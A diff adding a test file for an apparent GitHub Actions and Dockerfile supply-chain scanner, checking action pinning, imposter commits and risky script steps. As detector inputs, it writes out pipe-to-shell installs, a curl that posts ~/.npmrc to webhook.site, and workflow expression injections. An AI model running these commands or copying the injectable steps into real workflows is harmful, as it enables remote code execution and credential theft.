@@ -1,0 +1,319 @@
+import assert from 'node:assert/strict'
+import { describe, it } from 'node:test'
+import { ActionsScanError, dockerfileFindings, keptSource, readUses, resolveAction, scanWorkflow, usesKey, usesOfKey } from '../actions-scan/index.js'
+import { scriptFinds } from '../actions-scan/scripts/commands.js'
+import { lockedName, scriptFindings } from '../actions-scan/scripts/grade.js'
+import { latestOf, newestOfLines, tagVersion } from '../actions-scan/versions.js'
+
+const SHA = char => char.repeat(40)
+const ids = findings => findings.map(({ id, severity, line }) => `${id}/${severity}${line === undefined ? '' : `@${line}`}`)
+
+describe('a uses: as GitHub reads it', () => {
+  it('an action, a reusable workflow, the repository\'s own, an image, or none GitHub runs', () => {
+    assert.deepEqual(readUses('actions/checkout@v4'), { kind: 'action', uses: 'actions/checkout@v4', repo: 'actions/checkout', path: '', ref: 'v4', pin: 'ref', comment: null })
+    assert.deepEqual(readUses(`github/codeql-action/init@${SHA('a')}`, { comment: '# v3.28.0' }),
+      { kind: 'action', uses: `github/codeql-action/init@${SHA('a')}`, repo: 'github/codeql-action', path: 'init', ref: SHA('a'), pin: 'sha', comment: 'v3.28.0' })
+    assert.equal(readUses('org/repo/.github/workflows/ci.yml@main', { job: true }).kind, 'workflow')
+    assert.equal(readUses('org/repo/sub@main', { job: true }).kind, 'invalid', 'a job uses a workflow file alone')
+    assert.deepEqual(readUses('./.github/actions/setup/'), { kind: 'local', uses: './.github/actions/setup/', path: '.github/actions/setup' })
+    assert.deepEqual(readUses('$/.github/actions/setup'), { kind: 'local', uses: '$/.github/actions/setup', path: '.github/actions/setup', self: true })
+    assert.deepEqual(readUses('docker://alpine:3.20'), { kind: 'docker', uses: 'docker://alpine:3.20', image: 'alpine', tag: '3.20', digest: null })
+    assert.equal(readUses(`docker://ghcr.io:443/o/i@sha256:${'b'.repeat(64)}`).digest, `sha256:${'b'.repeat(64)}`)
+    for (const bad of ['actions/checkout', 'actions@v1', '-bad/x@v1', 'a/b/../c@v1', '${{ x }}@v1', 'docker://']) assert.equal(readUses(bad).kind, 'invalid', bad)
+  })
+
+  it('a pin: a full commit, a short one GitHub reads a branch or tag as too, or a ref', () => {
+    assert.equal(readUses(`a/b@${SHA('c')}`).pin, 'sha')
+    assert.equal(readUses('a/b@abc1234').pin, 'short-sha')
+    assert.equal(readUses('a/b@v1.2.3').pin, 'ref')
+    assert.equal(readUses('a/b@release/v1').ref, 'release/v1')
+  })
+
+  it('the version a comment beside a pin names, as Dependabot, Renovate, pinact and ratchet write one', () => {
+    for (const [comment, version] of [['# v4.1.1', 'v4.1.1'], ['#v4', 'v4'], ['# tag=v4.1.1', 'v4.1.1'], ['# pin@v2', 'v2'], ['# ratchet:actions/checkout@v4', 'v4'],
+      ['# 1.2.3', '1.2.3'], ['# needed for x', null], ['# v4 is fine', 'v4'], ['# v4x', null]]) {
+      assert.equal(readUses(`a/b@${SHA('d')}`, { comment }).comment, version, comment)
+    }
+  })
+
+  it('is resolved once by its key, a commit\'s with its comment', () => {
+    const uses = readUses(`Org/Repo/sub@${SHA('e')}`, { comment: '# v1.0.0' })
+    assert.equal(usesKey(uses), `org/repo/sub@${SHA('e')} # v1.0.0`)
+    assert.equal(usesKey(readUses('Org/Repo@v1', { comment: '# v1.0.0' })), 'org/repo@v1', 'a ref is resolved whatever its comment')
+    assert.deepEqual(usesOfKey(usesKey(uses)), { ...readUses(`org/repo/sub@${SHA('e')}`, { comment: '# v1.0.0' }) })
+    assert.equal(usesOfKey('org/repo/.github/workflows/x.yml@v1').kind, 'workflow')
+    assert.equal(usesOfKey('not a key'), null)
+  })
+})
+
+describe('what a script runs past a pin', () => {
+  const finds = script => scriptFinds(script).map(({ kind, tool, name, spec, exact, line }) => [kind, tool ?? null, name ?? null, spec ?? null, exact ?? null, line])
+
+  it('npm\'s tools: npx and its kin, by the package they run', () => {
+    assert.deepEqual(finds('npx eslint .\nnpx --yes tool@1.2.3 --flag\nnpx -p @scope/pkg@latest cmd\nnpx --no-install tsc\nnpx -c "echo"\nnpm exec -- vitest@3.0.0\nbunx cowsay\nbun x cowsay@1.0.0'), [
+      ['package', 'npx', 'eslint', null, false, 0], ['package', 'npx', 'tool', '1.2.3', true, 1], ['package', 'npx', '@scope/pkg', 'latest', false, 2],
+      ['package', 'npm exec', 'vitest', '3.0.0', true, 5], ['package', 'bunx', 'cowsay', null, false, 6], ['package', 'bun x', 'cowsay', '1.0.0', true, 7],
+    ])
+    assert.deepEqual(finds('pnpm dlx create-next-app@14.0.0\npnpx degit x\nyarn dlx @yarnpkg/sdks\nnpm create vite@latest app\nnpm init -y\nyarn create @scope\nnpm i -g pnpm@9.1.0 typescript').map(([, tool, name, spec]) => [tool, name, spec]), [
+      ['pnpm dlx', 'create-next-app', '14.0.0'], ['pnpx', 'degit', null], ['yarn dlx', '@yarnpkg/sdks', null], ['npm create', 'create-vite', 'latest'],
+      ['yarn create', '@scope/create', null], ['npm i -g', 'pnpm', '9.1.0'], ['npm i -g', 'typescript', null],
+    ])
+  })
+
+  it('installs that resolve anew, and those that hold to the lockfile', () => {
+    assert.deepEqual(finds('npm ci\nnpm install\npnpm install --frozen-lockfile\npnpm i --no-frozen-lockfile\nyarn\nyarn install --frozen-lockfile\nyarn build\nbun install\nnpm update').map(([kind, tool, , , , line]) => [kind, tool, line]), [
+      ['unlocked-install', 'npm install', 1], ['unlocked-install', 'pnpm i --no-frozen-lockfile', 3], ['unlocked-install', 'yarn', 4], ['unlocked-install', 'bun install', 7], ['unlocked-install', 'npm update', 8],
+    ])
+    assert.deepEqual(finds('npm install --save-dev left-pad ./local file:../x'), [['package', 'npm install', 'left-pad', null, false, 0]])
+  })
+
+  it('a script fetched and run: piped to a shell, substituted, or saved and then run', () => {
+    for (const script of ['curl -fsSL https://x/i.sh | sudo -E bash -', 'wget -qO- https://x.sh | sh', 'bash <(curl -s https://codecov.io/bash)',
+      'sh -c "$(curl -fsSL https://x/install.sh)"', 'iex ((New-Object Net.WebClient).DownloadString("https://x/y.ps1"))', 'irm https://x | iex',
+      'curl -sSLo i.sh https://x/i.sh\nchmod +x i.sh\n./i.sh', 'wget -qO- https://x/a.sh > a.sh; bash a.sh', 'curl -O https://x/setup.sh && sh setup.sh']) {
+      assert.ok(scriptFinds(script).some(({ kind }) => kind === 'remote-script'), script)
+    }
+    for (const script of ['curl -fsSL https://api.github.com/repos/x/y | jq .name', 'curl -o out.json https://x\ncat out.json', 'echo "curl x | sh"']) {
+      assert.ok(!scriptFinds(script).some(({ kind }) => kind === 'remote-script'), script)
+    }
+  })
+
+  it('other ecosystems\' tools, images and clones', () => {
+    assert.deepEqual(finds('pip install --upgrade pip\npip install requests==2.31.0 flask\npython -m pip install -r requirements.txt\npip install git+https://github.com/x/y\nuvx ruff\npipx run --spec black==24.1.0 black .').map(([, tool, name, spec, exact]) => [tool, name, spec, exact]), [
+      ['pip', 'pip', null, false], ['pip', 'requests', '==2.31.0', true], ['pip', 'flask', null, false], ['pip', 'git+https://github.com/x/y', null, false], ['uvx', 'ruff', null, false], ['pipx run', 'black', '==24.1.0', true],
+    ])
+    assert.deepEqual(finds('go install golang.org/x/tools/cmd/goimports@latest\ngo install github.com/x/y@v1.2.3\ncargo install cargo-audit\ncargo install --locked cargo-deny@0.14.0\ngem install bundler -v 2.4.22\ndeno run npm:cowsay@1.5.0').map(([, tool, name, spec, exact]) => [tool, name, spec, exact]), [
+      ['go install', 'golang.org/x/tools/cmd/goimports', 'latest', false], ['go install', 'github.com/x/y', 'v1.2.3', true], ['cargo install', 'cargo-audit', null, false],
+      ['cargo install', 'cargo-deny', '0.14.0', true], ['gem install', 'bundler', '2.4.22', true], ['deno run', 'cowsay', '1.5.0', true],
+    ])
+    assert.deepEqual(scriptFinds('docker run --rm -v $PWD:/w -w /w node:20 npm test\ngit clone https://github.com/x/y.git && make').map(({ kind, text, url }) => [kind, text ?? url]),
+      [['image', 'node:20'], ['clone', 'https://github.com/x/y.git']])
+  })
+
+  it('past settings, wrappers and comments, and in what a substitution runs', () => {
+    assert.deepEqual(finds('FOO=1 sudo -u ci env A=b npx cowsay \\\n  --arg\n# npx commented\necho done # npx neither\nV=$(npx -y semver@7.5.0 -i patch 1.0.0)').map(([, tool, name, , , line]) => [tool, name, line]),
+      [['npx', 'cowsay', 0], ['npx', 'semver', 4]])
+  })
+})
+
+describe('a script\'s findings, graded', () => {
+  const run = script => ({ script, line: 10, start: 11 })
+  const graded = (script, context = {}) => ids(scriptFindings(run(script), { locked: () => false, installed: false, external: false, triggers: [], ...context }))
+
+  it('npx runs the project\'s own where a lockfile locks it and it was installed, before or earlier in the script', () => {
+    const locked = name => lockedName(new Set(['eslint', 'typescript']), name)
+    assert.deepEqual(graded('npx eslint .', { locked }), ['fetched-package/high@11'], 'before any install')
+    assert.deepEqual(graded('npx eslint .', { locked, installed: true }), [])
+    assert.deepEqual(graded('npm ci\nnpx eslint .\nnpx tsc', { locked }), [], 'an install earlier in the script, tsc by typescript\'s')
+    assert.deepEqual(graded('npx eslint .\nnpm ci', { locked }), ['fetched-package/high@11'], 'an install after it')
+    assert.deepEqual(graded('npx left-pad', { locked, installed: true }), ['fetched-package/high@11'], 'locked by none')
+    assert.deepEqual(graded('npx left-pad@1.3.0', { installed: true }), ['fetched-package/moderate@11'], 'a version, not its integrity')
+    assert.deepEqual(graded('npm i -g corepack@${V}'), ['fetched-package/moderate@11'], 'a version a variable names')
+    assert.deepEqual(graded('npx eslint', { external: true, installed: true }), [], 'another\'s action, in a workspace that installed')
+  })
+
+  it('other tools by how they are pinned', () => {
+    assert.deepEqual(graded('pip install --upgrade pip setuptools\npip install flask==3.0.0\npip install flask'), ['fetched-package/notice@11', 'fetched-package/notice@11', 'fetched-package/moderate@12', 'fetched-package/high@13'])
+    assert.deepEqual(graded('go install x.dev/y@v1.2.3\ngo install x.dev/y@latest'), ['fetched-package/high@12'], 'a Go version held to its checksum database')
+    assert.deepEqual(graded('cargo install --locked x@1.0.0\ncargo install x@1.0.0'), ['fetched-package/moderate@12'])
+    assert.deepEqual(graded('npm install\nyarn\nbun install'), ['unlocked-install/moderate@11', 'unlocked-install/low@12', 'unlocked-install/low@13'])
+    assert.deepEqual(graded('docker run alpine\ndocker run node:20\ndocker pull node@sha256:' + 'c'.repeat(64)), ['unpinned-image/high@11', 'unpinned-image/moderate@12'])
+  })
+
+  it('services that exfiltrate, by risk\'s tags, and expressions anyone can write', () => {
+    assert.deepEqual(graded('curl -d @$HOME/.npmrc https://webhook.site/x\ncurl https://ipinfo.io'), ['hosts/critical@11', 'hosts/moderate@12'])
+    assert.deepEqual(graded('echo "${{ github.event.issue.title }}"\necho "${{ github.sha }}"'), ['script-injection/high@11'])
+    assert.deepEqual(graded('echo "${{ github.head_ref }}"', { triggers: ['pull_request_target'] }), ['script-injection/critical@11'])
+  })
+
+  it('on its own lines where it is a `|` block scalar, else on its key\'s', () => {
+    assert.deepEqual(ids(scriptFindings({ script: 'a\nb\ncurl x | sh', line: 4, start: null }, { locked: () => false, installed: false, external: false, triggers: [] })), ['remote-script/high@4'])
+  })
+})
+
+const WORKFLOW = `on:
+  pull_request_target:
+  workflow_run:
+    workflows: [build]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    container: node:20
+    services:
+      redis:
+        image: redis@sha256:${'d'.repeat(64)}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: \${{ github.event.pull_request.head.sha }}
+      - uses: myorg/shared-action@main
+      - uses: third/party@v1
+      - uses: third/pinned@${SHA('a')} # v1.0.0
+      - uses: third/short@abc1234
+      - uses: docker://alpine:3.20
+      - uses: ./.github/actions/setup
+      - run: |
+          npx eslint .
+          npx left-pad
+        working-directory: web
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            core.info("\${{ github.event.comment.body }}")
+      - uses: actions/download-artifact@v4
+        with:
+          run-id: \${{ github.event.workflow_run.id }}
+  reuse:
+    uses: third/workflows/.github/workflows/deploy.yml@v1
+    secrets: inherit
+`
+
+describe('a workflow\'s findings by its own text', () => {
+  it('each uses:, image and step, graded, on its line', () => {
+    const scan = scanWorkflow('workflow', WORKFLOW, { owner: 'myorg', lockfiles: [{ path: 'web/package-lock.json', names: new Set(['eslint']) }, { path: 'api/package-lock.json', names: new Set(['left-pad']) }] })
+    assert.deepEqual(scan.triggers, ['pull_request_target', 'workflow_run'])
+    assert.deepEqual(ids(scan.findings), [
+      'unpinned-image/moderate@8', 'unpinned/moderate@13', 'pwn-request/critical@15', 'unpinned/moderate@16', 'unpinned/high@17', 'short-sha/high@19', 'unpinned-image/moderate@20',
+      // eslint locked by web's lockfile and installed by the local action; left-pad only api's.
+      'fetched-package/high@24', 'unpinned/moderate@26', 'script-injection/critical@28', 'unpinned/moderate@30', 'untrusted-artifact/high@30', 'unpinned/high@34', 'secrets-inherited/high@34',
+    ])
+    assert.deepEqual(scan.uses.map(({ kind, uses, line }) => [kind, uses, line]), [
+      ['action', 'actions/checkout@v4', 13], ['action', 'myorg/shared-action@main', 16], ['action', 'third/party@v1', 17], ['action', `third/pinned@${SHA('a')}`, 18],
+      ['action', 'third/short@abc1234', 19], ['local', './.github/actions/setup', 21], ['action', 'actions/github-script@v7', 26], ['action', 'actions/download-artifact@v4', 30],
+      ['workflow', 'third/workflows/.github/workflows/deploy.yml@v1', 34],
+    ])
+    assert.equal(scan.uses[3].comment, 'v1.0.0')
+  })
+
+  it('an action\'s metadata: its runtime, its composite steps', () => {
+    const scan = scanWorkflow('action', 'name: x\nruns:\n  using: node16\n  main: index.js\n')
+    assert.equal(scan.using, 'node16')
+    assert.deepEqual(ids(scan.findings), ['deprecated-runtime/low@3'])
+    assert.deepEqual(ids(scanWorkflow('action', 'runs:\n  using: composite\n  steps:\n    - uses: a/b@main\n    - run: pnpm dlx x\n      shell: bash\n', { owner: 'a', external: true }).findings),
+      ['unpinned/moderate@4', 'fetched-package/high@5'])
+    assert.deepEqual(ids(scanWorkflow('action', `runs:\n  using: docker\n  image: docker://alpine@sha256:${'e'.repeat(64)}\n`).findings), [])
+    assert.deepEqual(ids(scanWorkflow('action', 'runs:\n  using: docker\n  image: docker://alpine\n').findings), ['unpinned-image/high@3'])
+  })
+
+  it('refuses what isn\'t YAML, a tag making code among it, or isn\'t a workflow', () => {
+    for (const text of ['on: push\njobs:\n  a:\n    steps:\n      - run: !!js/function "function () {}"\n', 'jobs: &j {}\nx:\n  <<: *j\n', 'a:\n\tb: 1\n', '- a\n', 'on: push\n']) {
+      assert.throws(() => scanWorkflow('workflow', text), error => error instanceof ActionsScanError && error.code === 'workflow-unreadable', JSON.stringify(text))
+    }
+    assert.throws(() => scanWorkflow('action', 'name: x\n'), { code: 'workflow-unreadable', message: 'an action has no runs.using' })
+    const read = scanWorkflow('workflow', "on: push\njobs:\n  a:\n    steps:\n      - run: 'function () { return 1 }'\n")
+    assert.deepEqual(read.findings, [], 'a function\'s text is a script\'s, run by a shell, not code made of it')
+  })
+})
+
+describe('a Dockerfile\'s findings', () => {
+  it('its images by a tag and what its RUN commands fetch, each on its line', () => {
+    assert.deepEqual(ids(dockerfileFindings(`FROM node:20 AS build\nRUN npm ci && \\\n    curl -fsSL https://x/i.sh | sh\nFROM build\nFROM alpine@sha256:${'a'.repeat(64)}\nFROM python:\${PY}\nRUN ["pip", "install", "requests"]\nFROM scratch`)),
+      ['unpinned-image/moderate@1', 'remote-script/high@2', 'unpinned-image/moderate@6', 'fetched-package/high@7'])
+  })
+})
+
+// GitHub as a source answers it, of `repos`, each `{ info, tags, branches,
+// history, files }`: `history` by a commit or a branch, the commits in it;
+// what was asked noted.
+function sourceOf(repos) {
+  const asked = []
+  const repo = name => repos[name.toLowerCase()]
+  return {
+    asked,
+    repo: name => { asked.push(['repo', name]); return Promise.resolve(repo(name)?.info ?? null) },
+    tags: name => { asked.push(['tags', name]); return Promise.resolve(repo(name)?.tags ?? []) },
+    tag: (name, tag) => Promise.resolve(repo(name)?.tags?.find(each => each.tag === tag)?.oid ?? null),
+    branch: (name, branch) => Promise.resolve(repo(name)?.branches?.find(each => each.branch === branch)?.oid ?? null),
+    branches: name => Promise.resolve({ branches: repo(name)?.branches ?? [], complete: repo(name)?.complete ?? true }),
+    contains(name, base, sha) {
+      asked.push(['contains', base, sha])
+      const { history = {}, missing = [] } = repo(name) ?? {}
+      return Promise.resolve(missing.includes(sha) ? null : (history[base] ?? [base]).includes(sha))
+    },
+    file: (name, path, commit) => Promise.resolve(repo(name)?.files?.[`${path}@${commit}`] ?? null),
+  }
+}
+
+// An action's repository: main at A, its history A > B > C; v1.0.0 at C,
+// v1.1.0 and the v1 that moves with it at B, v2.0.0 at A, and v2 moved to D,
+// a commit on no branch; `latest` at A.
+const ACT = {
+  info: { fullName: 'org/act', defaultBranch: 'main' },
+  tags: [{ tag: 'v1.0.0', oid: SHA('c') }, { tag: 'v1.1.0', oid: SHA('b') }, { tag: 'v1', oid: SHA('b') }, { tag: 'v2.0.0', oid: SHA('a') }, { tag: 'v2', oid: SHA('d') }, { tag: 'latest', oid: SHA('a') }],
+  branches: [{ branch: 'main', oid: SHA('a') }, { branch: 'dev', oid: SHA('9') }],
+  history: { main: [SHA('a'), SHA('b'), SHA('c')], [SHA('a')]: [SHA('a'), SHA('b'), SHA('c')], [SHA('b')]: [SHA('b'), SHA('c')] },
+  missing: [SHA('0')],
+  files: {
+    [`action.yml@${SHA('b')}`]: 'runs:\n  using: composite\n  steps:\n    - uses: other/thing@main\n    - uses: $/sub\n    - run: curl -sSL https://x/y.sh | bash\n      shell: bash\n',
+    [`action.yml@${SHA('a')}`]: 'runs:\n  using: docker\n  image: Dockerfile\n',
+    [`Dockerfile@${SHA('a')}`]: 'FROM alpine\n',
+    [`action.yaml@${SHA('c')}`]: 'runs:\n  using: node20\n  main: index.js\n',
+  },
+}
+
+describe('a reference resolved on GitHub', () => {
+  const resolve = async (text, comment = null, repos = null, owner = 'me') => {
+    const source = sourceOf(repos ?? { 'org/act': ACT })
+    const resolved = await resolveAction(readUses(text, { comment }), source, { owner })
+    return { ...resolved, asked: source.asked, found: ids(resolved.findings) }
+  }
+
+  it('a moving tag where its line\'s release is, an older line than the latest, and its code', async () => {
+    const v1 = await resolve('org/act@v1')
+    assert.deepEqual([v1.at, v1.commit, v1.tags, v1.latest, v1.using], ['tag', SHA('b'), ['v1.1.0', 'v1'], 'v2.0.0', 'composite'])
+    assert.deepEqual(v1.found, ['outdated/low', 'unpinned/high@4', 'remote-script/high@6'])
+    assert.deepEqual(v1.findings.slice(1).map(({ file }) => file), ['action.yml', 'action.yml'])
+    assert.deepEqual(v1.uses, [{ key: 'other/thing@main', line: 4, file: 'action.yml' }, { key: `org/act/sub@${SHA('b')}`, line: 5, file: 'action.yml' }], 'its own `$/` at the commit read')
+  })
+
+  it('a moving tag where no release of its line is, on no branch, as a repository taken has its tags', async () => {
+    assert.deepEqual((await resolve('org/act@v2')).found, ['tag-off-release/high', 'tag-off-branch/low', 'action-missing/moderate'])
+  })
+
+  it('a branch, a tag and a branch of one name, neither, and a tag that is no version', async () => {
+    assert.deepEqual((await resolve('org/act@main')).found, ['branch-ref/high', 'unpinned-image/high@1'])
+    assert.deepEqual((await resolve('org/act@v1', null, { 'org/act': { ...ACT, branches: [...ACT.branches, { branch: 'v1', oid: SHA('e') }] } })).found.slice(0, 1), ['ambiguous-ref/high'])
+    assert.deepEqual((await resolve('org/act@nope')).found, ['ref-missing/moderate'])
+    assert.deepEqual((await resolve('org/act@latest')).found, ['not-version/moderate', 'unpinned-image/high@1'])
+  })
+
+  it('a commit: a release\'s, held to its comment; one no tag names; one in no history of the repository; one GitHub hasn\'t', async () => {
+    assert.deepEqual((await resolve(`org/act@${SHA('b')}`, '# v1.1.0')).found, ['unpinned/high@4', 'remote-script/high@6'])
+    assert.deepEqual((await resolve(`org/act@${SHA('b')}`, '# v1')).found.slice(0, 1), ['unpinned/high@4'], 'the line of a release on it')
+    assert.deepEqual((await resolve(`org/act@${SHA('b')}`, '# v1.0.0')).found.slice(0, 1), ['comment-mismatch/high'])
+    assert.deepEqual((await resolve(`org/act@${SHA('c')}`)).found, [], 'action.yaml, where no action.yml is')
+    const imposter = await resolve(`org/act@${SHA('f')}`)
+    assert.deepEqual(imposter.found, ['imposter-commit/critical', 'action-missing/moderate'])
+    assert.deepEqual(imposter.asked.filter(([what]) => what === 'contains').map(([, base]) => base), ['main', SHA('a'), SHA('b'), SHA('9')], 'its default branch, each line\'s latest release, its other branches')
+    assert.deepEqual((await resolve(`org/act@${SHA('f')}`, null, { 'org/act': { ...ACT, complete: false } })).found.slice(0, 1), ['unverified-commit/high'], 'where more branches are')
+    assert.deepEqual((await resolve(`org/act@${SHA('0')}`)).found, ['commit-missing/high'], 'its code not read')
+    const untagged = await resolve(`org/act@${SHA('c')}`, null, { 'org/act': { ...ACT, tags: [] } })
+    assert.deepEqual(untagged.found, ['untagged-commit/moderate'])
+  })
+
+  it('the repository: none, moved, a fork, archived', async () => {
+    assert.deepEqual((await resolve('gone/x@v1')).found, ['repo-missing/critical'])
+    assert.deepEqual((await resolve('me/private@v1')).found, ['repo-missing/moderate'], 'the same owner\'s, maybe one this access can\'t read')
+    const moved = await resolve('old/name@v1', null, { 'old/name': { ...ACT, info: { fullName: 'new/name', defaultBranch: 'main', fork: 'up/stream', archived: true } } })
+    assert.deepEqual(moved.found.slice(0, 3), ['repo-moved/high', 'repo-fork/low', 'repo-archived/low'])
+    assert.equal(moved.repository.fullName, 'new/name')
+  })
+
+  it('kept for a scan, each answer by what was asked, a failure asked again', async () => {
+    let asked = 0
+    const source = keptSource({ ...sourceOf({ 'org/act': ACT }), tags: () => { asked++; return asked === 1 ? Promise.reject(new Error('busy')) : Promise.resolve(ACT.tags) } })
+    await assert.rejects(resolveAction(readUses('org/act@v1'), source), /busy/u)
+    await resolveAction(readUses('org/act@v1'), source)
+    await resolveAction(readUses('org/act@v2'), source)
+    assert.equal(asked, 2)
+  })
+})
+
+describe('versions of tags', () => {
+  it('a release of three parts, a major or minor tag that moves, none else', () => {
+    assert.deepEqual(['v4', 'v4.2', '4.2.1', 'v4.2.1-rc.1', 'latest', 'v'].map(tagVersion), [[4, null, null], [4, 2, null], [4, 2, 1], null, null, null])
+    const tags = ['v1', 'v1.9.0', 'v2', 'v2.0.0', 'v10.0.1', 'v10', 'nightly'].map(tag => ({ tag, oid: tag }))
+    assert.equal(latestOf(tags), 'v10.0.1')
+    assert.deepEqual(newestOfLines(tags).map(({ tag }) => tag), ['v10.0.1', 'v2.0.0', 'v1.9.0'])
+  })
+})
